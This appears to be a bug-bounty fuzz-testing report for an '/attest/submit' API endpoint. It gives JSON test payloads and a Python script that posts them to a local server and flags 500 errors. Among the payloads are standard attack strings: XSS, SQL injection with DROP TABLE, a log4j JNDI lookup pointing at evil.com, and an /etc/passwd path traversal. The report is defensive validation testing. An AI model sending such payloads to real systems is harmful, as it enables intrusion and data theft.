# Fuzz Testing Report: /attest/submit Endpoint

**Bounty:** #1112  
**Reward:** 10 RTC (+ bonus for bugs)

---

## Test Methodology

This document outlines the fuzzing approach for the `/attest/submit` endpoint.

### Test Categories

1. **Missing Fields**
2. **Wrong Types**
3. **Oversized Data**
4. **Injection Attempts**
5. **Boundary Conditions**

---

## Test Payloads

### 1. Missing Fields

```json
{}
```

Expected: 400 Bad Request  
Reason: Required fields missing

```json
{"miner_id": "test"}
```

Expected: 400 Bad Request  
Reason: Missing signature/data

### 2. Wrong Types

```json
{"miner_id": 123, "data": "test", "signature": "0xabc"}
```

Expected: 400 Bad Request  
Reason: miner_id should be string

```json
{"miner_id": "test", "data": 12345, "signature": "0xabc"}
```

Expected: 400 Bad Request  
Reason: data should be string

### 3. Oversized Data

```json
{"miner_id": "test", "data": "A" * 1000000, "signature": "0xabc"}
```

Expected: 400 or 413 Payload Too Large  
Reason: Data exceeds limits

### 4. Injection Attempts

```json
{"miner_id": "<script>alert('xss')</script>", "data": "test", "signature": "0xabc"}
```

Expected: 400 Bad Request  
Reason: Input sanitization

```json
{"miner_id": "test"; DROP TABLE miners;--", "data": "test", "signature": "0xabc"}
```

Expected: 400 Bad Request  
Reason: SQL injection prevention

### 5. Boundary Conditions

```json
{"miner_id": "", "data": "", "signature": ""}
```

Expected: 400 Bad Request  
Reason: Empty strings not valid

```json
{"miner_id": "a", "data": "a", "signature": "0x0"}
```

Expected: 400 Bad Request  
Reason: Invalid signature format

---

## Execution Script

```python
#!/usr/bin/env python3
"""
Fuzz testing script for /attest/submit endpoint.
"""

import requests
import json
from typing import List, Dict

ENDPOINT = "http://localhost:8545/attest/submit"

PAYLOADS = [
    # Missing fields
    ({}, "empty payload"),
    ({"miner_id": "test"}, "missing data"),
    ({"data": "test"}, "missing miner_id"),
    
    # Wrong types
    ({"miner_id": 123, "data": "test", "signature": "0xabc"}, "miner_id as int"),
    ({"miner_id": "test", "data": 123, "signature": "0xabc"}, "data as int"),
    ({"miner_id": "test", "data": "test", "signature": 123}, "signature as int"),
    ({"miner_id": [], "data": "test", "signature": "0xabc"}, "miner_id as array"),
    ({"miner_id": {}, "data": "test", "signature": "0xabc"}, "miner_id as object"),
    
    # Oversized
    ({"miner_id": "test", "data": "A" * 10000, "signature": "0xabc"}, "data 10kb"),
    ({"miner_id": "test", "data": "A" * 100000, "signature": "0xabc"}, "data 100kb"),
    ({"miner_id": "A" * 1000, "data": "test", "signature": "0xabc"}, "miner_id 1kb"),
    
    # Injection attempts
    ({"miner_id": "<script>alert(1)</script>", "data": "test", "signature": "0xabc"}, "xss in miner_id"),
    ({"miner_id": "test'; DROP TABLE--", "data": "test", "signature": "0xabc"}, "sql injection"),
    ({"miner_id": "${jndi:ldap://evil.com/a}", "data": "test", "signature": "0xabc"}, "log4j injection"),
    ({"miner_id": "../../../etc/passwd", "data": "test", "signature": "0xabc"}, "path traversal"),
    
    # Boundary
    ({"miner_id": "", "data": "", "signature": ""}, "empty strings"),
    ({"miner_id": " ", "data": " ", "signature": " "}, "whitespace only"),
    ({"miner_id": "null", "data": "null", "signature": "null"}, "null string"),
    ({"miner_id": "undefined", "data": "undefined", "signature": "undefined"}, "undefined"),
    
    # Unicode
    ({"miner_id": "测试", "data": "测试", "signature": "0xabc"}, "chinese chars"),
    ({"miner_id": "🎉", "data": "🎉", "signature": "0xabc"}, "emoji"),
    ({"miner_id": "\u0000", "data": "test", "signature": "0xabc"}, "null byte"),
    
    # Special characters
    ({"miner_id": "test\n\r\t", "data": "test", "signature": "0xabc"}, "whitespace chars"),
    ({"miner_id": "test\x00\xff", "data": "test", "signature": "0xabc"}, "binary data"),
]

def fuzz_endpoint():
    results = []
    
    for payload, description in PAYLOADS:
        try:
            response = requests.post(
                ENDPOINT,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            
            result = {
                "description": description,
                "payload": payload,
                "status_code": response.status_code,
                "response": response.text[:500],
                "is_500": response.status_code == 500,  # Bug!
            }
            
            print(f"[{'BUG!' if result['is_500'] else 'OK'}] {description}: {response.status_code}")
            
            results.append(result)
            
        except Exception as e:
            results.append({
                "description": description,
                "payload": payload,
                "error": str(e),
            })
    
    # Save results
    with open("fuzz_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    # Report bugs
    bugs = [r for r in results if r.get("is_500")]
    if bugs:
        print(f"\n🚨 Found {len(bugs)} potential bugs (500 errors)!")
        for bug in bugs:
            print(f"  - {bug['description']}")
    
    return results

if __name__ == "__main__":
    fuzz_endpoint()
```

---

## Expected Results

| Category | Expected Status | Notes |
|----------|-----------------|-------|
| Missing fields | 400 | Proper validation |
| Wrong types | 400 | Type checking |
| Oversized | 400/413 | Size limits |
| Injection | 400 | Sanitization |
| Boundary | 400 | Edge cases |

---

## Notes

- Any 500 error indicates a bug that should be fixed
- 400 errors are proper input validation
- This testing helps improve API robustness
